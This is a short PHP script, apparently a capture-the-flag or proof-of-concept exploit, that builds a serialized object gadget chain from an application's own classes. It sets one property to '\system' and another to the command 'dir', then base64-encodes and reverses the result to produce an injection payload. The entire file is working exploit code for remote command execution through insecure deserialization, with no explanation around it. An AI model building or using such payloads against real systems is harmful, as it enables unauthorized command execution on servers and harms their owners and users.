<?php
include("lib/class_user.php");
include("lib/class_debug.php");
include("lib/class_cookie.php");
include("lib/class_filemanager.php");
include("lib/class_articlebody.php");
include("lib/class_article.php");

$title = new Debug();
$title->fm = new User();
$title->fm->func = "\\system";
$title->fm->data = "dir";
$content = "foo";
$body = new ArticleBody($title,$content);
$art = new Article("foo","bar");
$art->body = $body;
echo strrev(base64_encode("1|".serialize($art)));